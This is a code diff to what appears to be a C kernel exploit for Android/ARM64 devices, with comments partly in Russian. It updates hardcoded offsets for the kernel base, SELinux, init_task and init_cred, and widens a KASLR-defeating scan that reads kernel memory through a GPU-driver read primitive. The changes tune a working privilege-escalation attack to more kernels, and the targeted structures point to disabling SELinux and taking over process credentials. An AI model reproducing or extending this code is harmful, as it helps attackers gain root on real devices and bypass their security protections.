@@ -24,8 +24,8 @@
 
 // ==================== РЕАЛЬНЫЕ СМЕЩЕНИЯ ДЛЯ ВАШЕГО ЯДРА ====================
 // Updated with Batch Spray and Fast Scan optimizations
-#define KERNEL_BASE          0xffffffc010000000ULL
-#define SELINUX_OFFSET       0x02caa000ULL
+#define KERNEL_BASE          0xffffffb000000000ULL
+#define SELINUX_OFFSET       0x02f74ce8ULL
 #define INIT_TASK_OFFSET     0x02afb380ULL
 #define INIT_CRED_OFFSET     0x018f9038ULL
 
@@ -1600,20 +1600,21 @@ static uint64_t find_kernel_base_auto(void)
     }
 
     uint64_t standard_bases[] = {
-        0xffffffc010000000ULL, 
         0xffffffc000000000ULL,
+        0xffffffb000000000ULL,
+        0xffffffc010000000ULL, 
         0xffffffc008200000ULL,
         0xffffff9550000000ULL, 
         0xffffff9540000000ULL,
         0xffffff9560000000ULL,
         0xffffff94d0000000ULL, 
         0xffffff94c0000000ULL,
-        0xffffff8e70000000ULL, // Added based on new pointers
+        0xffffff8e70000000ULL, 
         0xffffff8e60000000ULL,
         0xffffffc020000000ULL,
     };
 
-    for (int i = 0; i < 11; i++)
+    for (int i = 0; i < 12; i++)
     {
         uint8_t elf_magic[4];
         if (gpu_read_task_struct(fd, standard_bases[i], elf_magic, 4) == 0)
@@ -1625,9 +1626,9 @@ static uint64_t find_kernel_base_auto(void)
         }
     }
 
-    // NEW: Aggressive scan for ELF magic in typical KASLR range
+    // NEW: Aggressive scan for ELF magic in typical KASLR range (extended for b and c)
     fprintf(stderr, "[KBASE] Starting aggressive range scan for ELF magic...\n");
-    for (uint64_t test = 0xffffff8000000000ULL; test < 0xffffff9f00000000ULL; test += 0x200000ULL) {
+    for (uint64_t test = 0xffffff8000000000ULL; test < 0xffffffdf00000000ULL; test += 0x200000ULL) {
         uint8_t elf_magic[4];
         if (gpu_read_task_struct(fd, test, elf_magic, 4) == 0) {
             if (elf_magic[0] == 0x7f && elf_magic[1] == 'E' && elf_magic[2] == 'L' && elf_magic[3] == 'F') {
